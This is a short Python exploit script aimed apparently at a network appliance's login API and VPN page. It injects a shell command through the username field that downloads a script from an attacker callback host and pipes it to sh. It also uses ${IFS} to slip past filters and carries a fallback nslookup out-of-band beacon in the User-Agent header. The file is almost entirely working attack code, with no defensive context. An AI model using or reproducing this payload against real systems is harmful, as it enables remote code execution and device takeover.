import requests

def inject(target, callback, victim_id):
    command = 'curl${IFS}-sk${IFS}' + callback + '/s/' + victim_id + '|sh'
    payload = 'pitboss NSPPE-00;' + command + ';# unexpectedly died'
    requests.post(target + '/nitro/v1/config/login', json={'login': {'username': payload, 'password': 'x'}}, verify=False)
    fallback = 'pitboss NSPPE-00;nslookup${IFS}' + victim_id + '.p1.oob.' + callback.split(':')[0] + ';# unexpectedly died'
    requests.get(target + '/vpn/index.html', headers={'User-Agent': fallback}, verify=False)
